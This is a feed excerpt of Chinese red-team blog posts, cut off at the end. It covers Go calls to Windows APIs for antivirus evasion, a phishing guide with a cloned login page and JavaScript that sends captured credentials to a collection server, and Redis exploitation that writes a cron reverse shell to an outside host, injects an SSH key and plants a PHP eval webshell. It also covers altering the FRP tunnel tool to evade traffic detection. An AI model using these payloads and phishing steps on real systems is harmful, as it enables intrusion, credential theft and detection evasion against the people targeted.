    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="停手吧彦祖~ 别瞎鸡儿爆破了." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="c684dd471d063b840a71fd5189154356408c5faf30a9466254f86fee233b4f26"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这是高危文章需要密码才可以查看QAQ.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    <category term="红蓝对抗" scheme="https://www.ascotbe.com/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="mimikatz" scheme="https://www.ascotbe.com/tags/mimikatz/"/>
    
    <category term="Windows" scheme="https://www.ascotbe.com/tags/Windows/"/>
    
    <category term="域控搭建" scheme="https://www.ascotbe.com/tags/%E5%9F%9F%E6%8E%A7%E6%90%AD%E5%BB%BA/"/>
    
    <category term="域内操作" scheme="https://www.ascotbe.com/tags/%E5%9F%9F%E5%86%85%E6%93%8D%E4%BD%9C/"/>
    
    <category term="票据" scheme="https://www.ascotbe.com/tags/%E7%A5%A8%E6%8D%AE/"/>
    
    <category term="委派" scheme="https://www.ascotbe.com/tags/%E5%A7%94%E6%B4%BE/"/>
    
    <category term="虚拟机票据" scheme="https://www.ascotbe.com/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A5%A8%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Go使用WindowsApi笔记</title>
    <link href="https://www.ascotbe.com/2021/09/04/GoUseWindowsApi/"/>
    <id>https://www.ascotbe.com/2021/09/04/GoUseWindowsApi/</id>
    <published>2021-09-04T12:02:59.000Z</published>
    <updated>2023-01-05T06:17:01.849Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>在学Go相关的免杀，来提高木马的存活性，看到一些有意思的东西记下来</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/GoUseWindowsApi/1.gif" alt="1" style="zoom:50%;" /></p><h3 id="加载DLL"><a href="#加载DLL" class="headerlink" title="加载DLL"></a>加载DLL</h3><p>要在Go中加载DLL，可以使用<code>syscall.NewLazyDLL</code>或<code>syscall.LoadLibrary</code> 以及<code>syscall.MustLoadDLL</code>。</p><ul><li><code>NewLazyDLL</code>返回一个<code>*LazyDLL</code>，懒加载，只在第一次调用其函数时才加载库;</li><li><code>LoadLibrary</code>是立即加载DLL库。</li></ul><h3 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h3><blockquote><p>syscall.NewLazyDLL</p></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">user32 := syscall.NewLazyDLL(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">MessageBoxW := user32.NewProc(<span class="string">&quot;MessageBoxW&quot;</span>)</span><br><span class="line">MessageBoxW.Call(<span class="type">uintptr</span>(<span class="number">0</span>), <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;windows下的第一种调用方式&quot;</span>))), <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;ascotbe&quot;</span>))), <span class="type">uintptr</span>(<span class="number">0</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>syscall.LoadLibrary</p></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MB_YESNOCANCEL = <span class="number">0x00000003</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">user32, _ := syscall.LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">messageBox, _ := syscall.GetProcAddress(user32, <span class="string">&quot;MessageBoxW&quot;</span>)</span><br><span class="line">_, _, callErr := syscall.Syscall9(messageBox,</span><br><span class="line"><span class="number">4</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;第二种调用方式&quot;</span>))),</span><br><span class="line"><span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;ascotbe&quot;</span>))),</span><br><span class="line">MB_YESNOCANCEL,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> callErr != <span class="number">0</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>syscall.MustLoadDLL</p></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MB_YESNOCANCEL = <span class="number">0x00000003</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">user32      = syscall.MustLoadDLL(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">MessageBoxW = user32.MustFindProc(<span class="string">&quot;MessageBoxW&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">_, _, eeee := MessageBoxW.Call(<span class="number">0</span>,</span><br><span class="line"><span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;第三种调用方式&quot;</span>))),</span><br><span class="line"><span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(<span class="string">&quot;ascotbe&quot;</span>))),</span><br><span class="line">MB_YESNOCANCEL)</span><br><span class="line"><span class="keyword">if</span> eeee != <span class="literal">nil</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不管调用哪个API，<code>Call</code>的模式都是一样的。</p><p>而且<code>syscall.Syscall</code>函数始终返回<code>r1,r2 uintptr,err error</code>， 就最近的实践(windows_amd64)来看，基本可以确定:</p><ul><li>r1 始终返回 <code>syscall</code>的值；</li><li>r2 暂且使用；</li><li>err 返回调用Windows API<code>GetLastError</code>的结果，这是<code>syscall</code>自动调用的。</li></ul><p>而你传入<code>Call</code>中的值必须全部是<code>uintptr</code>，不管你原来的类型是什么</p><h3 id="API函数签名"><a href="#API函数签名" class="headerlink" title="API函数签名"></a>API函数签名</h3><p>在实际调用DLL函数之前，我们必须要了解一下过程所需要的参数，类型，大小。Microsoft将此描述为Windows API文档的一部分。如<code>CreateJobObjectA</code>的过程签名如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HANDLE CreateJobObjectA(</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpJobAttributes,</span><br><span class="line">  LPCSTR                lpName</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>也就是说，<code>CreateJobObjectA</code>需要一个指向<code>LPSECURITY_ATTRIBUTES</code>结构的指针，和一个指向C-String的指针（ASCII编码，技术上是<a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252编码</a> ;它与ASCII兼容）。</p><h3 id="C结构与Go结构"><a href="#C结构与Go结构" class="headerlink" title="C结构与Go结构"></a>C结构与Go结构</h3><p>在文档中我们可以搜索到，<code>LPSECURITY_ATTRIBUTES</code>是这么定义的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _SECURITY_ATTRIBUTES &#123;</span><br><span class="line">  DWORD  nLength;</span><br><span class="line">  LPVOID lpSecurityDescriptor;</span><br><span class="line">  BOOL   bInheritHandle;</span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>这时，我们就必须构造一个类似的Go结构来替代它。这时我们可以参考<code>syscall</code>中<a href="https://godoc.org/golang.org/x/sys/windows#SecurityAttributes">SecurityAttributes</a>的定义。</p><p>在Windows API中，我们可以看到，<code>SecurityAttributes</code>是这么定义的：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SECURITY_ATTRIBUTES</span> &#123;</span><br><span class="line">  DWORD  nLength;</span><br><span class="line">  LPVOID lpSecurityDescriptor;</span><br><span class="line">  BOOL   bInheritHandle;</span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>而Go中<a href="https://godoc.org/golang.org/x/sys/windows#SecurityAttributes">SecurityAttributes</a>的定义为：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> SecurityAttributes <span class="keyword">struct</span> &#123;</span><br><span class="line">    Length             <span class="type">uint32</span></span><br><span class="line">    SecurityDescriptor <span class="type">uintptr</span></span><br><span class="line">    InheritHandle      <span class="type">uint32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此我们大概知道， <code>DWORD</code>对应Go <code>uint32</code>， <code>LPVOID (* void)</code>对应<code>uintptr</code>，<code>BOOL</code>对应<code>uint32</code>。所以在你不知道用什么类型来表示C中对应的结构时，你可以去看看<code>syscall</code>或<code>go.sys</code>库中找找，或许能有收获。Windows一些参考类型<a href="https://docs.microsoft.com/en-us/windows/desktop/WinProg/windows-data-types">这里</a>也有描述。</p><p>然而，了解下面这些常见C类型与Go类型的对应关系会非常有用。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> (</span><br><span class="line">BOOL          <span class="type">uint32</span></span><br><span class="line">BOOLEAN       <span class="type">byte</span></span><br><span class="line">BYTE          <span class="type">byte</span></span><br><span class="line">DWORD         <span class="type">uint32</span></span><br><span class="line">DWORD64       <span class="type">uint64</span></span><br><span class="line">HANDLE        <span class="type">uintptr</span></span><br><span class="line">HLOCAL        <span class="type">uintptr</span></span><br><span class="line">LARGE_INTEGER <span class="type">int64</span></span><br><span class="line">LONG          <span class="type">int32</span></span><br><span class="line">LPVOID        <span class="type">uintptr</span></span><br><span class="line">SIZE_T        <span class="type">uintptr</span></span><br><span class="line">UINT          <span class="type">uint32</span></span><br><span class="line">ULONG_PTR     <span class="type">uintptr</span></span><br><span class="line">ULONGLONG     <span class="type">uint64</span></span><br><span class="line">WORD          <span class="type">uint16</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://razeencheng.com/post/breaking-all-the-rules-using-go-to-call-windows-api.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="Golang笔记" scheme="https://www.ascotbe.com/categories/Golang%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Golang" scheme="https://www.ascotbe.com/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>关于邮件钓鱼的哪些事(二)</title>
    <link href="https://www.ascotbe.com/2021/08/17/Office_0x02/"/>
    <id>https://www.ascotbe.com/2021/08/17/Office_0x02/</id>
    <published>2021-08-17T13:45:42.000Z</published>
    <updated>2023-01-05T06:17:01.632Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>首先需要编写一个<a href="https://github.com/Ascotbe/Medusa">钓鱼一键化平台</a>，然后进入我们的正题</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/Offer/39.png" alt="image-20210821112914140" style="zoom: 15%;" /></p><h2 id="搭建邮件服务器"><a href="#搭建邮件服务器" class="headerlink" title="搭建邮件服务器"></a>搭建邮件服务器</h2><h3 id="首先卸载Postfix"><a href="#首先卸载Postfix" class="headerlink" title="首先卸载Postfix"></a>首先卸载Postfix</h3><p>如果没有Postfix就跳过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop postfix</span><br><span class="line">sudo apt remove postfix &amp;&amp; apt purge postfix</span><br></pre></td></tr></table></figure><h3 id="安装Sendmail"><a href="#安装Sendmail" class="headerlink" title="安装Sendmail"></a>安装Sendmail</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install sendmail</span><br></pre></td></tr></table></figure><h3 id="配置Sendmail服务器"><a href="#配置Sendmail服务器" class="headerlink" title="配置Sendmail服务器"></a>配置Sendmail服务器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sendmailconfig</span><br></pre></td></tr></table></figure><h3 id="接收输入电子邮件"><a href="#接收输入电子邮件" class="headerlink" title="接收输入电子邮件"></a>接收输入电子邮件</h3><p>编辑<code>/etc/mail/sendmail.mc</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DAEMON_OPTIONS(`Family=inet,  Name=MTA-v4, Port=smtp, Addr=127.0.0.1&#x27;)dnl</span><br><span class="line">DAEMON_OPTIONS(`Family=inet,  Name=MSP-v4, Port=submission, M=Ea, Addr=127.0.0.1&#x27;)dnl</span><br><span class="line"></span><br><span class="line">#找到上面这两行修改为</span><br><span class="line">DAEMON_OPTIONS(`Family=inet,  Name=MTA-v4, Port=smtp, Addr=0.0.0.0&#x27;)dnl</span><br><span class="line">dnl   DAEMON_OPTIONS(`Family=inet,  Name=MSP-v4, Port=submission, M=Ea, Addr=127.0.0.1&#x27;)dnl</span><br></pre></td></tr></table></figure><p>然后将域名添加到<code>/etc/mail/local-host-names</code>文件中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascotbe.com</span><br><span class="line">mail.ascotbe.com</span><br><span class="line">localhost</span><br><span class="line">localhost.localdomain</span><br></pre></td></tr></table></figure><p>现在使用 m4宏处理器来编译Sendmail配置文件。m4是基于流的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo m4 /etc/mail/sendmail.mc &gt; /etc/mail/sendmail.cf</span><br></pre></td></tr></table></figure><p>重新启动Sendmail服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart sendmail</span><br></pre></td></tr></table></figure><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>里面有一些报错，比方说为什么发送失败等等</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/mail.log</span><br></pre></td></tr></table></figure><h3 id="多服务方案"><a href="#多服务方案" class="headerlink" title="多服务方案"></a>多服务方案</h3><blockquote><p>最好是sendmail和medusa搭建在同一台服务器上</p><p>而不是使用多服务方案</p></blockquote><p>如果你的Medusa在一个服务器，而邮件服务器又在一个地方，需要修改邮件服务中的配置，打开<code>/etc/mail/access</code>文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#添加全局配置</span><br><span class="line">202.222 RELAY</span><br><span class="line">#或者添加单IP发送配置，这个IP为你Medusa的服务器IP</span><br><span class="line">192.111.111.111  RELAY</span><br></pre></td></tr></table></figure><p>配置完需要重启服务器</p><h3 id="配置域名解析"><a href="#配置域名解析" class="headerlink" title="配置域名解析"></a>配置域名解析</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/Offer/40.png" alt="image-20210818111703403"></p><h2 id="编写钓鱼页面"><a href="#编写钓鱼页面" class="headerlink" title="编写钓鱼页面"></a>编写钓鱼页面</h2><p>一般把目标网站copy到本地，然后把页面中的<code>/test/login.html</code>进行补全<code>http://127.0.0.1/test/login.html</code>，具体看网页去，然后修改action标签</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;javascript:login()&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>一般是这样的，我们只需要把函数进行修改或者自定义，替换成下面函数</p><p><strong>不同的网页不同的改法，我这边只是做个样例</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> login2 = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>()</span><br><span class="line"><span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>()</span><br><span class="line"><span class="keyword">var</span> region = $(<span class="string">&quot;#region&quot;</span>).<span class="title function_">val</span>()</span><br><span class="line"><span class="keyword">if</span> (username.<span class="property">length</span> == <span class="number">0</span> || password.<span class="property">length</span> == <span class="number">0</span> || region.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//alert(&#x27;你东西没填是吧&#x27;)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;空&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username.<span class="property">length</span> == <span class="number">0</span>)</span><br><span class="line">$.<span class="title function_">get</span>(<span class="string">&#x27;http://127.0.0.1:9999/b/sasdasdasd/?&#x27;</span>, &#123;</span><br><span class="line"><span class="attr">username</span>: username,</span><br><span class="line"><span class="attr">password</span>: password,</span><br><span class="line"><span class="attr">region</span>: region</span><br><span class="line">&#125;, <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;http://ascotbe.com&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);&#125;</span><br></pre></td></tr></table></figure><blockquote><p>整站拉取</p></blockquote><p>可以使用kali或者Ubuntu进行下载，然后进行网站克隆，一般不太会用到，做个记录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install httrack</span><br></pre></td></tr></table></figure><h2 id="钓鱼网站搭建"><a href="#钓鱼网站搭建" class="headerlink" title="钓鱼网站搭建"></a>钓鱼网站搭建</h2><blockquote><p>安装nginx</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>查看安装版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -v</span><br></pre></td></tr></table></figure><p>启动nginx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure><p>然后输入服务器IP就能看到下面效果</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/Offer/41.png" alt="image-20210817160653634"></p><blockquote><p>配置钓鱼页面</p></blockquote><p>进入nginx默认的网页目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/html</span><br></pre></td></tr></table></figure><p>你会看到index.html、index.htm、index.nginx-debian.html三个文件中的任意一个（建议全部删了）然后把你改好的钓鱼页面放到上面</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/Offer/42.png" alt="image-20210817161251555">修改nginx的配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/nginx/sites-enabled/default</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/Offer/43.png" alt="image-20210817160440321"></p><p>接着重启服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure><p>可以看到已经成功的页面</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/Offer/44.png" alt="image-20210821113122300"></p><p>配置SSL证书，还是对<code>/etc/nginx/sites-enabled/default</code>文件进行修改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # 服务器端口使用443，开启ssl, 这里ssl就是上面安装的ssl模块</span><br><span class="line">    listen       443 ssl;</span><br><span class="line">    #填写绑定证书的域名</span><br><span class="line">    server_name  ascotbe.com;</span><br><span class="line">    </span><br><span class="line">    # ssl证书地址</span><br><span class="line">    ssl_certificate     /etc/nginx/cert/ssl.crt;  #证书文件名称</span><br><span class="line">    ssl_certificate_key  /etc/nginx/cert/ssl.key; # 私钥文件名称</span><br><span class="line">    </span><br><span class="line">    # ssl验证相关配置</span><br><span class="line">    ssl_session_timeout  5m;    #缓存有效期</span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;    #加密算法</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;    #安全链接可选的加密协议</span><br><span class="line">    ssl_prefer_server_ciphers on;   #使用服务器端的首选算法</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">    #网站主页路径。此路径仅供参考，具体请您按照实际目录操作</span><br><span class="line">        root   /var/www/html;</span><br><span class="line">        index  logon.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  ascotbe.com;</span><br><span class="line">    return 301 https://$server_name$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最好重启Nginx即可看到结果</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/Offer/45.png" alt="image-20210817184011177"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="红蓝对抗" scheme="https://www.ascotbe.com/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="免杀" scheme="https://www.ascotbe.com/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="红蓝对抗" scheme="https://www.ascotbe.com/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    <category term="邮件钓鱼" scheme="https://www.ascotbe.com/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>Redis写SHELL</title>
    <link href="https://www.ascotbe.com/2021/07/12/RedisWritesShell/"/>
    <id>https://www.ascotbe.com/2021/07/12/RedisWritesShell/</id>
    <published>2021-07-12T15:07:46.000Z</published>
    <updated>2023-01-05T06:17:01.848Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><h2 id="通过计划任务获取SHELL"><a href="#通过计划任务获取SHELL" class="headerlink" title="通过计划任务获取SHELL"></a>通过计划任务获取SHELL</h2><p>首先进行连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.251.17 -p 6379</span><br></pre></td></tr></table></figure><p>然后设置文件夹路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure><p>如果出现<code>(error) ERR Changing directory: Permission denied</code>标明Redis并不是root权限启动的，权限不足，需要使用<code>redis-server /etc/redis/redis.conf</code>来启动程序，不能使用<code>service redis start</code>来启动</p><p>接着修改文件，Ubuntu的计划任务是在这个文件中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure><p>设置计划任务，需要添加<code>\n</code>符号，因为写进去后会有很多无用数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.251.16/8899 0&gt;&amp;1\n\n\n&quot;</span><br></pre></td></tr></table></figure><p>保存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="通过SSH-key获取SHELL"><a href="#通过SSH-key获取SHELL" class="headerlink" title="通过SSH key获取SHELL"></a>通过SSH key获取SHELL</h2><p>首先生成公钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>然后把key写入文本中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(echo -e &quot;\n\n\n\n&quot;; cat test.pub; echo -e &quot;\n\n\n\n&quot;) &gt; test.txt</span><br></pre></td></tr></table></figure><p>接着使用命令启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat test.txt | redis-cli -h 192.168.251.18 -p 6379 -x set crack</span><br><span class="line">redis-cli -h 192.168.251.18 -p 6379</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="通过Web目录写SHELL"><a href="#通过Web目录写SHELL" class="headerlink" title="通过Web目录写SHELL"></a>通过Web目录写SHELL</h2><p>需要条件</p><ul><li>知道web目录</li><li>当前用户在该目录下具有写权限</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/ascotbe.com/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set 1 &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="红蓝对抗" scheme="https://www.ascotbe.com/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="Redis" scheme="https://www.ascotbe.com/tags/Redis/"/>
    
    <category term="SHELL" scheme="https://www.ascotbe.com/tags/SHELL/"/>
    
  </entry>
  
  <entry>
    <title>常见工具特征去除</title>
    <link href="https://www.ascotbe.com/2021/07/09/FrequentToolCharacteristics/"/>
    <id>https://www.ascotbe.com/2021/07/09/FrequentToolCharacteristics/</id>
    <published>2021-07-09T15:07:46.000Z</published>
    <updated>2023-01-05T06:17:01.848Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/1.png" alt="image-20210709162951851" style="zoom:50%;" /></p><h2 id="FRP改造"><a href="#FRP改造" class="headerlink" title="FRP改造"></a>FRP改造</h2><blockquote><h3 id="改造之前"><a href="#改造之前" class="headerlink" title="改造之前"></a>改造之前</h3></blockquote><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/2.png" alt="image-20210707150953360"></p><p>在受害者机器上使用<code>frpc.exe -c frpc_socker.ini</code>连接服务起的时候，会产生一个这种数据校检</p><blockquote><h3 id="流量改造"><a href="#流量改造" class="headerlink" title="流量改造"></a>流量改造</h3></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pkg\msg\msg.go</span><br></pre></td></tr></table></figure><p>这几个函数中保存着上面的信息</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/3.png" alt="image-20210707151346655"></p><p>我在前加个了前缀</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/4.png" alt="image-20210708142818186"></p><p>而在<code>pkg\util\version\version.go</code> 中定义了版本信息，这里也可以修改一下</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/5.png" alt="image-20210707153734705"></p><p>改成随便一个版本</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/6.png" alt="image-20210708142835960"></p><p>结果如下</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/7.png" alt="image-20210708145449323"></p><blockquote><h3 id="编译方式"><a href="#编译方式" class="headerlink" 